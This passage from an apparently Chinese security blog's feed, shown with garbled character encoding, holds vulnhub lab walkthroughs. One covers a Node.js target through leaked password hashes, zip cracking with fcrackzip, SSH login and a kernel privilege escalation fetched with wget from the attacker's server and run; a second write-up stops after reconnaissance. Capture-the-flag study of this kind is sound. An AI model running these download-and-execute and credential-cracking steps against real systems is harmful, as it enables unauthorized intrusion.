title="äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹"></a>äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹</h2><p>kaliæ”»å‡»æœºipä¸º192.168.101.128</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="1-ä¿¡æ¯æ”¶é›†"><a href="#1-ä¿¡æ¯æ”¶é›†" class="headerlink" title="1. ä¿¡æ¯æ”¶é›†"></a>1. ä¿¡æ¯æ”¶é›†</h3><ul><li>æ‰«æå­˜æ´»ä¸»æœºï¼šç›®æ ‡ä¸»æœºipä¸º192.168.101.137</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ–è€…Netdiscover</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144643259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144643259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>é€šè¿‡pingè¿›è¡Œä¸‰å±‚å‘ç°ï¼Œæ ¹æ®ttl&#x3D;64åˆæ­¥æ¨æµ‹è¯¥ä¸»æœºä¸ºLinux</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.137</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>é€šè¿‡masscanå››å±‚å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾ç«¯å£</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.137</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›®æ ‡ä¸»æœºåªå¼€äº†ä¸¤ä¸ªç«¯å£ï¼Œåˆ†åˆ«æ˜¯22å’Œ3000ç«¯å£</p><ul><li><p>æ‰«æç›®æ ‡ç«¯å£æœåŠ¡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.137 -oN nmap.A</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>ç›®æ ‡å¼€å¯äº†ä»¥ä¸‹ç«¯å£åŠæœåŠ¡ï¼š<ul><li>22ç«¯å£ï¼ŒæœåŠ¡ä¸ºOpenSSH 7.2p2;ä¸”ç³»ç»Ÿä¸ºUbunru 4 ubuntu2.2</li><li>3000ç«¯å£ï¼ŒæœåŠ¡ä¸ºApacheã€‚ä¸”æ‰«æåˆ°äº†&#x2F;loginè·¯å¾„ï¼ŒçŒœæµ‹æ˜¯åå°ç™»å½•ç•Œé¢</li></ul></li></ul><blockquote><p>nodejsé»˜è®¤ç«¯å£3000ï¼Œä¸”nodejsæ˜¯ä¸€ä¸ªåŸºäºChrome JavaScriptè¿è¡Œå»ºç«‹çš„ä¸€ä¸ªå¹³å°ï¼ŒåŸºäºGoogle V8å¼•æ“ï¼Œæ€§èƒ½å¾ˆå¥½</p></blockquote><p>ä½¿ç”¨Nmapä¸­æ¼æ´åˆ†ç±»NSEè„šæœ¬å¯¹ç›®æ ‡è¿›è¡Œæ¢æµ‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.137</span><br></pre></td></tr></table></figure><hr><p>ç›®æ ‡webæœåŠ¡ä¸ºNode.js Expressçš„ç«™ï¼Œå…¶ä»–æ¼æ´ä¿¡æ¯æ²¡ä»€ä¹ˆæœ‰æ•ˆçš„ï¼Œéƒ½æ˜¯Dosï¼ˆä¸ç®—æ´ï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150143184.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150143184.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è®¿é—®ç›®æ ‡3000ç«¯å£ webæœåŠ¡ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150036209.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150036209.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è®¿é—®loginè·¯å¾„ï¼šä½†æ˜¯æ­¤é¡µé¢æ²¡æµ‹å‡ºæ¥å¼±å¯†ç å’ŒSQL</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="2-è¶Šæƒ"><a href="#2-è¶Šæƒ" class="headerlink" title="2. è¶Šæƒ"></a>2. è¶Šæƒ</h3><p>åœ¨é¦–é¡µæºç é—²é€›æ—¶ï¼Œçœ‹åˆ°åœ¨<code>view-source:http://192.168.101.137:3000/assets/js/app/controllers/home.js</code>ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> controllers = angular.<span class="title function_">module</span>(<span class="string">&#x27;controllers&#x27;</span>);</span><br><span class="line"></span><br><span class="line">controllers.<span class="title function_">controller</span>(<span class="string">&#x27;HomeCtrl&#x27;</span>, <span class="keyword">function</span> (<span class="params">$scope, $http</span>) &#123;</span><br><span class="line">  $http.<span class="title function_">get</span>(<span class="string">&#x27;/api/users/latest&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">    $scope.<span class="property">users</span> = res.<span class="property">data</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªAngularJSæ§åˆ¶å™¨ï¼Œå‘½åä¸ºHomeCtrlï¼Œæ¥æ”¶scopeå’Œhttpä¸¤ä¸ªå‚æ•°ã€‚æ§åˆ¶å™¨ä¸­å‘æœåŠ¡å™¨<code>/api/users/latest</code>å‘èµ·GETè¯·æ±‚ï¼Œç”¨then()å¤„ç†ç›¸åº”å¹¶æŠŠæ•°æ®èµ‹ç»™$scope.users</p></blockquote><p>è·Ÿéšè·¯å¾„åˆ°&#x2F;api&#x2F;users&#x2F;latestï¼Œçœ‹åˆ°äº†ç”¨æˆ·ååŠå…¶passwordçš„jsonæ•°æ®ï¼Œä¸è¿‡è¿™é‡Œåªæœ‰éç®¡ç†å‘˜ç”¨æˆ·</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153128915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153128915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†å‘ä¸Šä¸€çº§ï¼Œæ‰¾åˆ°ç®¡ç†å‘˜ç”¨æˆ·ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153300331.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153300331.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°†ç®¡ç†å‘˜ç”¨æˆ·<code>myP14ceAdminAcc0uNT</code>çš„å¯†ç <code>dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af</code>æ‹¿åˆ°somd5è§£å¯†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153428460.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153428460.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯†ç ä¸º<code>manchester</code></p><p>ç™»å½•æˆåŠŸï¼Œç½‘é¡µä¸­å¿ƒæœ‰<code>Download backup</code>æŒ‰é’®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="3-çˆ†ç ´è§£å‹å‹ç¼©åŒ…"><a href="#3-çˆ†ç ´è§£å‹å‹ç¼©åŒ…" class="headerlink" title="3. çˆ†ç ´è§£å‹å‹ç¼©åŒ…"></a>3. çˆ†ç ´è§£å‹å‹ç¼©åŒ…</h3><p>ä¸‹è½½ä¸‹æ¥çœ‹åˆ°æ˜¯base64ç¼–ç ï¼Œè§£ç ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d myplace.backup &gt; decode.backup</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ–‡ä»¶ç±»å‹ä¸ºzipï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155751094.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155751094.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è§£å‹éœ€è¦å¯†ç ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”¨fcrackzipï¼Œå­—å…¸rockyouè¿›è¡Œçˆ†ç ´ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decode.backup</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯†ç ä¸ºmagicword</p><h3 id="4-sshç™»å½•"><a href="#4-sshç™»å½•" class="headerlink" title="4. sshç™»å½•"></a>4. sshç™»å½•</h3><p>unzipè§£å‹åå‡ºç°varæ–‡ä»¶å¤¹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160806475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160806475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨app.jsä¸­å®šä¹‰çš„urlå¸¸é‡ï¼Œ<code>mark:5AYRft73VtFpc84k@localhost:27017</code>å¾ˆåƒsshç™»å½•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°è¯•è¿›è¡Œsshç™»å½•ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mark@192.168.101.137</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="5-ubuntu16-04å†…æ ¸ææƒ"><a href="#5-ubuntu16-04å†…æ ¸ææƒ" class="headerlink" title="5. ubuntu16.04å†…æ ¸ææƒ"></a>5. ubuntu16.04å†…æ ¸ææƒ</h3><ul><li>æŸ¥çœ‹ç”¨æˆ·çš„sudoæƒé™ï¼š</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>markç”¨æˆ·ä¸èƒ½ä½¿ç”¨sudo</p><ul><li>æŸ¥çœ‹æœ‰suidçš„å‘½ä»¤ï¼š</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ²¡æœ‰findè¿™ç§ææƒçš„å‘½ä»¤</p><ul><li>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬åŠæ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼š</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†…æ ¸ç‰ˆæœ¬ä¸º4.4.0-93ï¼Œç³»ç»Ÿç‰ˆæœ¬ä¸ºubuntu16.04</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162035164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162035164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨gccå’Œç‰ˆæœ¬</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœç´¢ubuntu 16.04å­˜åœ¨çš„æ¼æ´ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŠŠexpä¸‹è½½åˆ°æœ¬åœ°ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 44298.c</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ¬åœ°ç”¨pythonèµ·ä¸€ä¸ªwebæœåŠ¡ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é¶æœºä¸Šcdåˆ°tmpç›®å½•ä¸‹è½½exp</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.101.128:8000/44298.c</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>gccç¼–è¯‘æ‰§è¡Œexp:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc 44298.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨&#x2F;rootç›®å½•ä¸‹æ‰¾åˆ°flag:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173408611.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173408611.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>flag:&#x3D;&#x3D;1722e99ca5f353b362556a62bd5e6be0&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhubé¶æœºæ¸—é€CH4INRULZ_v1.0.1</title>
      <link href="/2023/06/29/vulnhub-ba-ji-ch4inrulz-v1.0.1/"/>
      <url>/2023/06/29/vulnhub-ba-ji-ch4inrulz-v1.0.1/</url>
      
        <content type="html"><![CDATA[<h1 id="CH4INRULZ-v1-0-1"><a href="#CH4INRULZ-v1-0-1" class="headerlink" title="CH4INRULZ_v1.0.1"></a>CH4INRULZ_v1.0.1</h1><h2 id="ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†"><a href="#ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†" class="headerlink" title="ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†"></a>ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†</h2><table><thead><tr><th>èµ„äº§ç¼–å·</th><th>èµ„äº§åˆ†ç±»</th><th>èµ„äº§åç§°</th><th>èµ„äº§è§„æ ¼</th><th>è®¿é—®åœ°å€</th><th>å¤‡æ³¨&#x2F;é—®é¢˜</th></tr></thead><tbody><tr><td>CH4INRULZ_v1.0.1</td><td>ä¸»æœºç³»ç»Ÿ</td><td>Ubuntuæ“ä½œç³»ç»Ÿ</td><td>Type:Linux<br />IP:192.168.101.133<br />Port:21ã€22ã€80ã€8081</td><td>192.168.101.133</td><td>opensshç‰ˆæœ¬è¾ƒä½ï¼Œwebå¤‡ä»½ä¿¡æ¯æ³„éœ²å¯¼è‡´çš„åå°å¯ç™»å½•ã€‚æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚è„ç‰›ææƒ</td></tr></tbody></table><p>é¶æœºflag:&#x3D;&#x3D;8f420533b79076cc99e9f95a1a4e5568&#x3D;&#x3D;</p><p>é¶æœºåœ°å€ï¼š<a href="https://download.vulnhub.com/ch4inrulz/CH4INRULZ_v1.0.1.ova">https://download.vulnhub.com/ch4inrulz/CH4INRULZ_v1.0.1.ova</a></p><h2 id="äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹"><a href="#äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹" class="headerlink" title="äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹"></a>äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹</h2><p>kaliæ”»å‡»æœºipä¸º192.168.101.128</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="ï¼ˆ1ï¼‰ä¿¡æ¯æ”¶é›†"><a href="#ï¼ˆ1ï¼‰ä¿¡æ¯æ”¶é›†" class="headerlink" title="ï¼ˆ1ï¼‰ä¿¡æ¯æ”¶é›†"></a>ï¼ˆ1ï¼‰ä¿¡æ¯æ”¶é›†</h3><ul><li>é€šè¿‡netdiscoverè¿›è¡ŒäºŒå±‚å‘ç°ï¼Œå‘ç°åœ°å€ä¸º192.168.101.133ä¸»æœº</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.101.0/24</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092713572.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092713572.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªå·¥å…·æˆ‘åœ¨ç¬¬äºŒæ¬¡æ‰«çš„æ—¶å€™ä¸€ç›´æ‰«ä¸å‡ºæ¥ï¼Œæ‰«ä¸å‡ºæ¥å°±arp-scan</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626164847570.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626164847570.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>é€šè¿‡pingè¿›è¡Œä¸‰å±‚å‘ç°ï¼Œæ ¹æ®ttl&#x3D;64åˆæ­¥æ¨æµ‹è¯¥ä¸»æœºä¸ºLinux</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.133</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092952688.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092952688.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>é€šè¿‡masscanå››å±‚å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾ç«¯å£</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.133</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626093143394.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626093143394.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›®æ ‡ä¸»æœºå¼€å¯äº†80webæœåŠ¡ç«¯å£ï¼Œ22sshç«¯å£ï¼Œ8011webç«¯å£ï¼Œ21ftpç«¯å£</p><ul><li><p>æ‰«æç›®æ ‡ç«¯å£æœåŠ¡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.133 -oN nmap.A</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094024734.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094024734.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>ç›®æ ‡å¼€å¯äº†ä»¥ä¸‹ç«¯å£åŠæœåŠ¡ï¼š<ul><li>21ç«¯å£ï¼ŒæœåŠ¡ä¸ºvsftpd 2.3.5;</li><li>22ç«¯å£ï¼ŒæœåŠ¡ä¸ºOpenSSH 5.9p1;ä¸”ç³»ç»Ÿä¸ºDebian 5 çš„ubuntu1.10</li><li>80ç«¯å£ï¼ŒæœåŠ¡ä¸ºApacha 2.2.22</li><li>8011ç«¯å£ï¼ŒæœåŠ¡å’Œ80ç«¯å£ä¸€æ ·</li></ul></li></ul><p>ä½¿ç”¨Nmapä¸­æ¼æ´åˆ†ç±»NSEè„šæœ¬å¯¹ç›®æ ‡è¿›è¡Œæ¢æµ‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.133</span><br></pre></td></tr></table></figure><hr><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094353403.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094353403.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>opensshå’ŒwebæœåŠ¡éƒ½å­˜åœ¨ç›¸åº”çš„CVEå’Œå¯¹åº”çš„exp</p><p>è®¿é—®ç›®æ ‡webæœåŠ¡ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094818002.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094818002.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯¹å…¶webæœåŠ¡è¿›è¡Œç›®å½•æ‰«æï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.101.133</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100221981.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100221981.png" 